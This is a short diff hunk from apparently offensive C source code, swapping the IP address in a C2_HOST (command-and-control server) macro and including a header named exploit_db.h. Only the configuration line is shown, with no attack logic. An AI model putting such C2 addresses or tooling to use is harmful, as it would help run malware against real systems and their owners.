@@ -19,7 +19,7 @@
 #include "exploit_db.h"
 
 #ifndef C2_HOST
-#define C2_HOST "93.95.231.134"
+#define C2_HOST "207.244.255.208"
 #endif
 #include "report_system.h"
 #include "ascii_art.h"
